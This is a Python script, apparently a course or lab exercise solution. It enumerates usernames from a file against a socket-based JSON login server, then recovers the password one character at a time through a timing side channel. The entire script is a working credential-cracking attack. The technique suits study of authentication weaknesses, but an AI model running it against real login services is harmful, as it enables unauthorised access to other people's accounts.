import sys
import socket
import json
import string
from datetime import datetime, timedelta

ip_address = sys.argv[1]
port = int(sys.argv[2])


def attempt_login(login_, client_socket_):
        login_json = json.dumps(login_)

        client_socket_.send(login_json.encode())

        response_json = client_socket_.recv(1024).decode()
        return json.loads(response_json)


def get_logins():
    with open("logins.txt") as f:
        for line in f:
            yield {"login": line.strip(), "password": " "}


def get_next_char():
    password_pool = string.ascii_lowercase + \
                    string.ascii_uppercase + \
                    string.digits
    for c in password_pool:
        yield c


with socket.socket() as client_socket:
    address = (ip_address, port)
    client_socket.connect(address)

    # Try all logins with an empty password.
    login_generator = get_logins()

    correct_login = {}

    while True:
        login = next(login_generator)

        response = attempt_login(login, client_socket)

        if response.get("result") == "Wrong password!":
            correct_login = login
            break

    # Try out every possible password each char
    correct_so_far = ""

    char_generator = get_next_char()

    while True:
        try_char = next(char_generator)
        correct_login["password"] = correct_so_far + try_char

        start_time = datetime.now()
        response = attempt_login(correct_login, client_socket)
        finish_time = datetime.now()

        time_difference = finish_time - start_time

        if time_difference > timedelta(milliseconds=100):
            correct_so_far += try_char
            char_generator = get_next_char()
        elif response.get("result") == "Connection success!":
            break

print(json.dumps(correct_login))



